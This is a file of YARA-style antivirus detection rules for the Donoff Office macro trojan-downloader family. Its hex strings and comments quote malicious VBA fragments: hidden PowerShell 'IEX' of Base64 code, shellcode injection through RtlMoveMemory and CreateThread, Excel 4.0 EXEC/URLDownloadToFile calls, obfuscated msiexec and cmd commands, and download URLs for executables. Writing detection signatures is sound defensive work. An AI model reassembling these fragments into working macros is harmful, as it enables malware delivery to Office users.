
rule TrojanDownloader_O97M_Donoff_SS_MTB{
	meta:
		description = "TrojanDownloader:O97M/Donoff.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_03_0 = {53 75 62 20 64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 [0-03] 69 6e 69 74 20 22 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c 31 2e 68 74 61 22 2c 20 52 65 70 6c 61 63 65 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2c 20 22 39 71 7a 75 22 2c 20 22 22 29 [0-03] 45 6e 64 20 53 75 62 } //1
		$a_01_1 = {53 65 74 20 6f 62 6a 57 69 6e 44 65 76 20 3d 20 4e 65 77 20 57 73 68 53 68 65 6c 6c } //1 Set objWinDev = New WshShell
		$a_01_2 = {6f 62 6a 57 69 6e 44 65 76 2e 65 78 65 63 20 22 63 6d 64 20 2f 63 20 22 20 2b 20 64 65 76 44 69 72 44 6f 63 } //1 objWinDev.exec "cmd /c " + devDirDoc
	condition:
		((#a_03_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Donoff_SS_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Donoff.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {53 65 74 20 73 46 69 6c 65 20 3d 20 46 73 6f 2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 67 50 61 74 68 20 26 20 22 2f 54 65 73 74 46 69 6c 65 2e 6a 73 22 2c 20 54 72 75 65 29 } //1 Set sFile = Fso.CreateTextFile(gPath & "/TestFile.js", True)
		$a_01_1 = {73 46 69 6c 65 2e 57 72 69 74 65 4c 69 6e 65 20 28 22 22 20 26 20 76 6c 29 } //1 sFile.WriteLine ("" & vl)
		$a_01_2 = {3d 20 22 73 6a 2e 75 64 55 38 73 65 32 35 68 67 4b 4c 2e 67 6e 70 } //1 = "sj.udU8se25hgKL.gnp
		$a_03_3 = {72 75 6e 63 61 6c 63 20 3d 20 53 68 65 6c 6c 28 22 [0-20] 26 20 53 74 72 52 65 76 65 72 73 65 28 76 6c 32 29 29 [0-03] 45 6e 64 20 53 75 62 } //1
		$a_01_4 = {4d 73 67 42 6f 78 20 28 22 22 20 26 20 73 65 78 65 63 29 } //1 MsgBox ("" & sexec)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_03_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_Donoff_SS_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/Donoff.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {78 48 74 74 70 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 73 3a 2f 2f 6d 61 69 6c 73 65 6e 64 69 6e 67 2e 73 69 74 65 2f 48 61 70 70 79 5f 43 53 2f 68 61 70 70 79 46 75 6e 2e 65 78 65 22 2c 20 46 61 6c 73 65 } //1 xHttp.Open "GET", "https://mailsending.site/Happy_CS/happyFun.exe", False
		$a_03_1 = {2e 73 61 76 65 74 6f 66 69 6c 65 20 22 43 3a 2f 2f 57 69 6e 64 6f 77 73 2f 54 65 6d 70 2f 4d 69 63 72 6f 73 6f 66 74 20 57 6f 72 6c 64 2e 65 78 65 22 2c 20 32 [0-03] 45 6e 64 20 57 69 74 68 } //1
		$a_01_2 = {44 69 6d 20 6f 53 68 65 6c 6c 3a 20 53 65 74 20 6f 53 68 65 6c 6c 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 43 72 69 70 74 2e 73 68 65 6c 6c 22 29 } //1 Dim oShell: Set oShell = CreateObject("WSCript.shell")
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Donoff_SS_MTB_4{
	meta:
		description = "TrojanDownloader:O97M/Donoff.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {73 55 52 4c 20 3d 20 22 68 74 74 70 3a 2f 2f 70 36 39 32 30 2e 63 6c 6f 75 64 73 65 72 76 65 72 32 35 35 2e 63 6f 6d 2f 30 61 7a 37 76 6a 62 39 6a 62 65 66 62 6b 6d 75 23 23 23 23 23 23 23 23 23 } //1 sURL = "http://p6920.cloudserver255.com/0az7vjb9jbefbkmu#########
		$a_01_1 = {52 75 6e 50 72 6f 63 65 73 73 20 43 6c 65 61 6e 28 73 55 52 4c 29 2c 20 45 6e 63 6f 64 65 42 61 73 65 36 34 28 50 41 59 4c 4f 41 44 29 } //1 RunProcess Clean(sURL), EncodeBase64(PAYLOAD)
		$a_01_2 = {49 6e 53 74 72 28 31 2c 20 64 61 74 61 2c 20 22 23 22 29 20 3e 20 30 20 54 68 65 6e } //1 InStr(1, data, "#") > 0 Then
		$a_01_3 = {45 6e 63 6f 64 65 42 61 73 65 36 34 20 3d 20 52 65 70 6c 61 63 65 28 4d 69 64 28 2e 74 65 78 74 2c 20 35 29 2c 20 76 62 4c 66 2c 20 22 22 29 } //1 EncodeBase64 = Replace(Mid(.text, 5), vbLf, "")
		$a_01_4 = {6f 62 6a 48 54 54 50 2e 4f 70 65 6e 20 22 50 4f 53 54 22 2c 20 73 55 52 4c 2c 20 46 61 6c 73 65 } //1 objHTTP.Open "POST", sURL, False
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_Donoff_SS_MTB_5{
	meta:
		description = "TrojanDownloader:O97M/Donoff.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {62 61 62 79 34 20 3d 20 22 31 32 33 30 39 34 38 25 31 32 33 30 39 34 38 25 31 32 33 30 39 34 38 25 31 32 33 30 39 34 38 40 6a } //1 baby4 = "1230948%1230948%1230948%1230948@j
		$a_01_1 = {68 65 61 74 20 3d 20 68 61 74 65 31 20 2b 20 68 61 74 65 32 20 2b 20 68 61 74 65 33 20 2b 20 53 74 72 69 6e 67 28 31 2c 20 22 68 22 29 20 2b 20 53 74 72 69 6e 67 28 32 2c 20 22 74 22 29 20 2b 20 62 61 62 79 32 32 20 2b 20 53 74 72 69 6e 67 28 31 2c 20 22 3a 22 29 20 2b 20 74 65 6d 70 6f 20 2b 20 62 61 62 79 34 20 26 20 62 61 62 79 39 39 39 39 39 } //1 heat = hate1 + hate2 + hate3 + String(1, "h") + String(2, "t") + baby22 + String(1, ":") + tempo + baby4 & baby99999
		$a_01_2 = {53 68 65 6c 6c 20 28 68 65 61 74 29 } //1 Shell (heat)
		$a_03_3 = {62 61 62 79 39 39 39 39 39 20 3d 20 22 2e 6d 70 22 20 2b 20 53 74 72 69 6e 67 28 31 2c 20 22 2f 22 29 20 2b 20 22 [0-0f] 22 20 26 20 53 74 72 69 6e 67 28 35 2c } //1
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_03_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_Donoff_SS_MTB_6{
	meta:
		description = "TrojanDownloader:O97M/Donoff.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 06 00 00 "
		
	strings :
		$a_01_0 = {6d 39 37 34 65 33 65 33 33 34 62 36 34 61 63 31 33 62 36 64 65 63 39 39 37 66 62 61 62 66 32 31 66 20 3d 20 22 6e 61 69 76 65 72 65 6d 6f 76 65 } //1 m974e3e334b64ac13b6dec997fbabf21f = "naiveremove
		$a_01_1 = {70 72 71 68 68 71 72 61 62 63 20 3d 20 22 66 61 64 7a 6a 67 64 69 6c 61 7a 75 } //1 prqhhqrabc = "fadzjgdilazu
		$a_01_2 = {57 73 68 53 68 65 6c 6c 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 } //1 WshShell = CreateObject("WScript.Shell")
		$a_01_3 = {71 6f 78 6e 77 6b 71 6e 68 66 73 68 68 69 6d 72 20 3d 20 22 2a 22 20 26 20 62 75 72 67 65 72 6f 72 67 61 6e 20 26 20 22 2a 22 } //1 qoxnwkqnhfshhimr = "*" & burgerorgan & "*"
		$a_01_4 = {57 73 68 53 68 65 6c 6c 2e 53 70 65 63 69 61 6c 46 6f 6c 64 65 72 73 28 22 54 65 6d 70 6c 61 74 65 73 22 29 } //1 WshShell.SpecialFolders("Templates")
		$a_01_5 = {57 73 68 53 68 65 6c 6c 2e 53 70 65 63 69 61 6c 46 6f 6c 64 65 72 73 28 22 52 65 63 65 6e 74 22 29 } //1 WshShell.SpecialFolders("Recent")
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_Donoff_SS_MTB_7{
	meta:
		description = "TrojanDownloader:O97M/Donoff.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {53 68 65 6c 6c 20 28 70 69 67 6c 65 74 20 26 20 22 20 2d 57 20 48 69 64 64 65 6e 20 2d 63 20 49 45 58 28 22 20 26 20 6f 77 6c 65 74 20 26 20 22 29 20 22 29 } //1 Shell (piglet & " -W Hidden -c IEX(" & owlet & ") ")
		$a_01_1 = {6f 77 6c 65 74 20 3d 20 6f 77 6c 65 74 20 2b 20 22 5c 22 22 20 22 20 26 20 77 68 65 6c 70 20 26 20 22 20 5c 22 22 29 29 3b 49 45 58 20 24 63 76 27 } //1 owlet = owlet + "\"" " & whelp & " \""));IEX $cv'
		$a_01_2 = {6f 77 6c 65 74 20 3d 20 6f 77 6c 65 74 20 2b 20 22 5b 53 79 73 74 65 6d 2e 54 65 78 74 2e 45 6e 63 6f 64 69 6e 67 5d 3a 3a 55 6e 69 63 6f 64 65 2e 47 65 74 53 74 72 69 6e 67 28 5b 53 79 73 74 65 6d 2e 43 6f 6e 76 65 72 74 5d 3a 3a 46 72 6f 6d 42 61 73 65 36 34 53 74 72 69 6e 67 28 } //1 owlet = owlet + "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(
		$a_01_3 = {77 68 65 6c 70 20 3d 20 77 68 65 6c 70 20 2b 20 22 77 42 32 41 47 55 41 63 67 41 67 41 48 4d 41 59 77 42 79 41 47 38 41 59 67 42 71 41 43 34 41 5a 41 42 73 41 47 77 41 } //1 whelp = whelp + "wB2AGUAcgAgAHMAYwByAG8AYgBqAC4AZABsAGwA
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_Donoff_SS_MTB_8{
	meta:
		description = "TrojanDownloader:O97M/Donoff.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,07 00 07 00 07 00 00 "
		
	strings :
		$a_01_0 = {44 69 6d 20 4f 6a 65 71 76 6f 20 41 73 20 4c 6f 6e 67 2c 20 4a 77 6c 71 6f 20 41 73 20 56 61 72 69 61 6e 74 2c 20 4f 68 7a 62 20 41 73 20 4c 6f 6e 67 } //1 Dim Ojeqvo As Long, Jwlqo As Variant, Ohzb As Long
		$a_03_1 = {23 49 66 20 56 42 41 37 20 54 68 65 6e [0-06] 44 69 6d 20 59 67 6c 65 72 6a 20 41 73 20 4c 6f 6e 67 50 74 72 2c 20 50 6b 78 20 41 73 20 4c 6f 6e 67 50 74 72 } //1
		$a_01_2 = {46 6f 72 20 4f 68 7a 62 20 3d 20 4c 42 6f 75 6e 64 28 4a 77 6c 71 6f 29 20 54 6f 20 55 42 6f 75 6e 64 28 4a 77 6c 71 6f 29 } //1 For Ohzb = LBound(Jwlqo) To UBound(Jwlqo)
		$a_01_3 = {4f 6a 65 71 76 6f 20 3d 20 4a 77 6c 71 6f 28 4f 68 7a 62 29 } //1 Ojeqvo = Jwlqo(Ohzb)
		$a_01_4 = {3d 20 52 74 6c 4d 6f 76 65 4d 65 6d 6f 72 79 28 59 67 6c 65 72 6a 20 2b 20 4f 68 7a 62 2c 20 4f 6a 65 71 76 6f 2c 20 31 29 } //1 = RtlMoveMemory(Yglerj + Ohzb, Ojeqvo, 1)
		$a_01_5 = {3d 20 43 72 65 61 74 65 54 68 72 65 61 64 28 30 2c 20 30 2c 20 59 67 6c 65 72 6a 2c 20 30 2c 20 30 2c 20 30 29 } //1 = CreateThread(0, 0, Yglerj, 0, 0, 0)
		$a_01_6 = {53 75 62 20 57 6f 72 6b 62 6f 6f 6b 5f 4f 70 65 6e 28 29 } //1 Sub Workbook_Open()
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1+(#a_01_6  & 1)*1) >=7
 
}
rule TrojanDownloader_O97M_Donoff_SS_MTB_9{
	meta:
		description = "TrojanDownloader:O97M/Donoff.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,08 00 08 00 08 00 00 "
		
	strings :
		$a_01_0 = {41 79 42 74 48 54 54 43 78 61 5a 46 48 65 4a 20 3d 20 41 79 42 74 48 54 54 43 78 61 5a 46 48 65 4a 20 2b 20 22 70 22 } //2 AyBtHTTCxaZFHeJ = AyBtHTTCxaZFHeJ + "p"
		$a_01_1 = {41 79 42 74 48 54 54 43 78 61 5a 46 48 65 4a 20 3d 20 41 79 42 74 48 54 54 43 78 61 5a 46 48 65 4a 20 2b 20 22 7a 22 } //2 AyBtHTTCxaZFHeJ = AyBtHTTCxaZFHeJ + "z"
		$a_01_2 = {6e 59 44 45 64 57 78 4d 4c 53 53 77 71 48 54 20 3d 20 6e 59 44 45 64 57 78 4d 4c 53 53 77 71 48 54 20 2b 20 22 70 22 } //2 nYDEdWxMLSSwqHT = nYDEdWxMLSSwqHT + "p"
		$a_01_3 = {6e 59 44 45 64 57 78 4d 4c 53 53 77 71 48 54 20 3d 20 6e 59 44 45 64 57 78 4d 4c 53 53 77 71 48 54 20 2b 20 22 7a 22 } //2 nYDEdWxMLSSwqHT = nYDEdWxMLSSwqHT + "z"
		$a_03_4 = {66 20 3d 20 78 73 61 64 77 71 64 77 71 64 28 [0-15] 29 } //1
		$a_01_5 = {53 68 65 6c 6c 20 66 } //1 Shell f
		$a_01_6 = {78 73 61 64 77 71 64 77 71 64 20 3d 20 73 74 72 49 6e 70 75 74 } //1 xsadwqdwqd = strInput
		$a_01_7 = {4d 69 64 28 73 74 72 49 6e 70 75 74 2c 20 69 2c 20 31 29 20 3d 20 43 68 72 28 41 73 63 28 4d 69 64 28 73 74 72 49 6e 70 75 74 2c 20 69 2c 20 31 29 29 20 2d 20 6e 29 } //1 Mid(strInput, i, 1) = Chr(Asc(Mid(strInput, i, 1)) - n)
	condition:
		((#a_01_0  & 1)*2+(#a_01_1  & 1)*2+(#a_01_2  & 1)*2+(#a_01_3  & 1)*2+(#a_03_4  & 1)*1+(#a_01_5  & 1)*1+(#a_01_6  & 1)*1+(#a_01_7  & 1)*1) >=8
 
}
rule TrojanDownloader_O97M_Donoff_SS_MTB_10{
	meta:
		description = "TrojanDownloader:O97M/Donoff.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,07 00 07 00 07 00 00 "
		
	strings :
		$a_01_0 = {75 20 3d 20 22 75 72 22 20 26 20 43 68 72 28 31 30 38 29 20 26 20 22 6d 6f 6e 22 } //1 u = "ur" & Chr(108) & "mon"
		$a_01_1 = {6c 20 3d 20 22 55 52 22 20 26 20 43 68 72 28 37 36 29 20 26 20 22 44 6f 77 6e 22 20 26 20 43 68 72 28 31 30 38 29 20 26 20 22 6f 61 64 54 6f 46 69 22 20 26 20 43 68 72 28 31 30 38 29 20 26 20 22 65 41 } //1 l = "UR" & Chr(76) & "Down" & Chr(108) & "oadToFi" & Chr(108) & "eA
		$a_01_2 = {6b 65 79 77 6f 72 64 73 20 3d 20 22 3d 20 43 41 4c 4c 28 22 22 22 20 2b 20 75 20 2b 20 22 22 22 2c 20 22 22 22 20 2b 20 6c 20 2b 20 22 22 22 2c 20 22 22 4a 4a 43 43 4a 4a 22 22 2c 20 30 2c 20 22 22 22 20 2b 20 74 69 74 6c 65 20 2b 20 22 22 22 2c 20 22 22 22 20 2b 20 63 6f 6d 6d 65 6e 74 73 20 2b 20 22 22 22 2c 20 30 2c 20 30 29 } //1 keywords = "= CALL(""" + u + """, """ + l + """, ""JJCCJJ"", 0, """ + title + """, """ + comments + """, 0, 0)
		$a_01_3 = {53 65 74 20 45 78 63 65 6c 53 68 65 65 74 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 45 78 63 65 6c 2e 41 70 70 6c 69 63 61 74 69 6f 6e 22 29 } //1 Set ExcelSheet = CreateObject("Excel.Application")
		$a_01_4 = {20 3d 20 22 3d 45 58 45 43 28 22 22 22 20 2b 20 63 6f 6d 6d 65 6e 74 73 20 2b 20 22 22 22 29 } //1  = "=EXEC(""" + comments + """)
		$a_01_5 = {3d 20 22 3d 57 41 49 54 28 4e 4f 57 28 29 20 2b 20 22 22 30 30 3a 30 30 3a 38 22 22 29 } //1 = "=WAIT(NOW() + ""00:00:8"")
		$a_01_6 = {73 74 72 4d 61 63 72 6f 20 3d 20 22 72 75 6e 74 68 69 73 } //1 strMacro = "runthis
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1+(#a_01_6  & 1)*1) >=7
 
}
rule TrojanDownloader_O97M_Donoff_SS_MTB_11{
	meta:
		description = "TrojanDownloader:O97M/Donoff.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 "
		
	strings :
		$a_01_0 = {53 65 74 20 6f 41 70 70 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 68 65 6c 6c 2e 41 70 70 6c 69 63 61 74 69 6f 6e 22 29 } //1 Set oApp = CreateObject("Shell.Application")
		$a_01_1 = {6f 41 70 70 2e 4e 61 6d 65 73 70 61 63 65 28 65 46 6e 61 6d 65 29 2e 43 6f 70 79 48 65 72 65 20 6f 41 70 70 2e 4e 61 6d 65 73 70 61 63 65 28 7a 46 6e 61 6d 65 29 2e 69 74 65 6d 73 } //1 oApp.Namespace(eFname).CopyHere oApp.Namespace(zFname).items
		$a_01_2 = {66 6c 64 72 5f 61 64 64 65 65 5f 6e 61 6d 65 20 3d 20 45 6e 76 69 72 6f 6e 24 28 22 55 53 45 52 50 52 4f 46 49 4c 45 22 29 20 26 20 22 5c 4d 52 74 6d 65 64 69 61 5c 22 } //1 fldr_addee_name = Environ$("USERPROFILE") & "\MRtmedia\"
		$a_01_3 = {75 6e 61 64 64 65 65 69 70 20 66 6c 64 72 5f 61 64 64 65 65 5f 6e 61 6d 65 20 26 20 66 69 6c 65 5f 61 64 64 65 65 5f 6e 61 6d 65 20 26 20 22 2e 7a 69 70 22 2c 20 66 6c 64 72 5f 61 64 64 65 65 5f 6e 61 6d 65 } //1 unaddeeip fldr_addee_name & file_addee_name & ".zip", fldr_addee_name
		$a_01_4 = {53 68 65 6c 6c 20 66 6c 64 72 5f 61 64 64 65 65 5f 6e 61 6d 65 20 26 20 66 69 6c 65 5f 61 64 64 65 65 5f 6e 61 6d 65 20 26 20 22 2e 65 22 20 26 20 22 78 65 22 2c 20 76 62 4e 6f 72 6d 61 6c 4e 6f 46 6f 63 75 73 } //1 Shell fldr_addee_name & file_addee_name & ".e" & "xe", vbNormalNoFocus
		$a_01_5 = {61 72 31 61 64 64 65 65 20 3d 20 53 70 6c 69 74 28 55 73 65 72 46 6f 72 6d 31 2e 54 65 78 74 42 6f 78 31 2e 54 65 78 74 2c 20 22 61 22 29 } //1 ar1addee = Split(UserForm1.TextBox1.Text, "a")
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=6
 
}
rule TrojanDownloader_O97M_Donoff_SS_MTB_12{
	meta:
		description = "TrojanDownloader:O97M/Donoff.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {3d 20 22 57 22 20 26 20 22 73 43 22 20 26 20 22 52 22 20 2b 20 22 69 50 74 22 20 26 20 22 2e 73 22 20 2b 20 22 48 65 22 20 26 20 22 4c 6c } //1 = "W" & "sC" & "R" + "iPt" & ".s" + "He" & "Ll
		$a_01_1 = {20 3d 20 22 63 4d 22 20 26 20 22 44 20 2f 63 20 4d 5e 73 69 5e 45 5e 78 65 5e 63 20 22 20 26 } //1  = "cM" & "D /c M^si^E^xe^c " &
		$a_01_2 = {43 68 72 28 33 32 29 20 26 20 43 68 72 28 31 30 34 29 20 26 20 43 68 72 28 31 31 36 29 20 26 20 43 68 72 28 31 31 36 29 20 26 20 43 68 72 28 31 31 32 29 20 26 20 43 68 72 28 35 38 29 20 26 20 43 68 72 28 34 37 29 20 26 20 43 68 72 28 34 37 29 20 26 20 43 68 72 28 31 31 36 29 20 26 20 43 68 72 28 31 30 31 29 20 26 20 43 68 72 28 31 30 34 29 } //1 Chr(32) & Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & Chr(116) & Chr(101) & Chr(104)
		$a_01_3 = {26 20 43 68 72 28 31 31 34 29 20 26 20 43 68 72 28 31 30 31 29 20 26 20 43 68 72 28 31 31 30 29 20 26 20 43 68 72 28 39 38 29 20 26 20 43 68 72 28 31 30 31 29 20 26 20 43 68 72 28 31 31 34 29 20 26 20 43 68 72 28 31 30 33 29 20 26 20 43 68 72 28 34 36 29 20 26 20 43 68 72 28 39 39 29 20 26 20 43 68 72 28 31 31 31 29 20 26 20 43 68 72 28 31 30 39 29 20 26 } //1 & Chr(114) & Chr(101) & Chr(110) & Chr(98) & Chr(101) & Chr(114) & Chr(103) & Chr(46) & Chr(99) & Chr(111) & Chr(109) &
		$a_01_4 = {43 68 72 28 34 37 29 20 26 20 43 68 72 28 31 30 30 29 20 26 20 43 68 72 28 31 31 31 29 20 26 20 43 68 72 28 31 31 39 29 20 26 20 43 68 72 28 31 31 30 29 20 26 20 43 68 72 28 31 30 38 29 20 26 20 43 68 72 28 31 31 31 29 20 26 20 43 68 72 28 39 37 29 20 26 20 43 68 72 28 31 30 30 29 20 26 20 43 68 72 28 34 36 29 20 26 20 43 68 72 28 31 31 32 29 20 26 20 43 68 72 28 31 30 34 29 20 26 20 43 68 72 28 31 31 32 } //1 Chr(47) & Chr(100) & Chr(111) & Chr(119) & Chr(110) & Chr(108) & Chr(111) & Chr(97) & Chr(100) & Chr(46) & Chr(112) & Chr(104) & Chr(112
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_Donoff_SS_MTB_13{
	meta:
		description = "TrojanDownloader:O97M/Donoff.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,0b 00 0b 00 0b 00 00 "
		
	strings :
		$a_01_0 = {2c 20 22 58 2e 58 56 22 2c 20 22 68 74 74 70 22 29 } //1 , "X.XV", "http")
		$a_01_1 = {2c 20 22 43 2e 43 6b 22 2c 20 22 65 22 29 } //1 , "C.Ck", "e")
		$a_01_2 = {2c 20 22 4b 2e 6d 50 22 2c 20 22 50 22 29 } //1 , "K.mP", "P")
		$a_01_3 = {28 22 42 34 45 32 44 36 30 35 46 36 37 37 33 34 45 32 33 34 42 36 32 37 33 37 38 36 33 34 45 32 33 34 42 36 43 36 43 36 30 32 34 32 } //1 ("B4E2D605F67734E234B627378634E234B6C6C60242
		$a_01_4 = {44 6f 20 55 6e 74 69 6c 20 22 66 75 46 71 64 67 48 68 51 62 6a 54 75 71 44 43 66 4e 51 4a 22 20 3c 3e 20 22 56 6f 41 48 62 68 62 78 4f 78 55 74 66 71 68 43 76 59 46 6b 54 79 70 63 79 52 61 73 6a 66 42 70 4d } //1 Do Until "fuFqdgHhQbjTuqDCfNQJ" <> "VoAHbhbxOxUtfqhCvYFkTypcyRasjfBpM
		$a_01_5 = {53 65 74 20 52 65 67 58 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 56 42 53 63 72 69 70 74 2e 52 65 67 45 78 70 22 29 } //1 Set RegX = CreateObject("VBScript.RegExp")
		$a_01_6 = {52 65 70 6c 61 63 65 64 54 65 78 74 20 3d 20 52 65 67 58 2e 52 65 70 6c 61 63 65 28 4d 79 53 74 72 69 6e 67 2c 20 52 65 70 6c 61 63 65 53 74 72 69 6e 67 29 } //1 ReplacedText = RegX.Replace(MyString, ReplaceString)
		$a_01_7 = {73 54 6d 70 43 68 61 72 20 3d 20 43 68 72 28 22 26 48 22 20 26 20 4d 69 64 28 73 44 61 74 61 2c 20 69 43 68 61 72 2c 20 47 72 61 76 69 74 79 29 29 } //1 sTmpChar = Chr("&H" & Mid(sData, iChar, Gravity))
		$a_01_8 = {53 65 74 20 47 20 3d 20 52 65 67 58 2e 45 78 65 63 75 74 65 28 53 74 72 29 } //1 Set G = RegX.Execute(Str)
		$a_01_9 = {53 65 74 20 6f 62 6a 53 74 61 72 74 75 70 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 69 6e 6d 67 6d 74 73 3a 57 69 6e 33 32 5f 50 72 6f 63 65 73 73 53 74 61 72 74 75 70 22 29 } //1 Set objStartup = CreateObject("winmgmts:Win32_ProcessStartup")
		$a_03_10 = {53 65 74 20 6f 4f 75 74 50 61 72 61 6d 73 20 3d 20 6f 50 72 6f 63 65 73 73 2e 45 78 65 63 4d 65 74 68 6f 64 5f 28 [0-0f] 28 22 34 33 37 32 36 35 36 31 37 34 36 35 22 29 2c 20 6f 49 6e 50 61 72 61 6d 73 } //1
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1+(#a_01_6  & 1)*1+(#a_01_7  & 1)*1+(#a_01_8  & 1)*1+(#a_01_9  & 1)*1+(#a_03_10  & 1)*1) >=11
 
}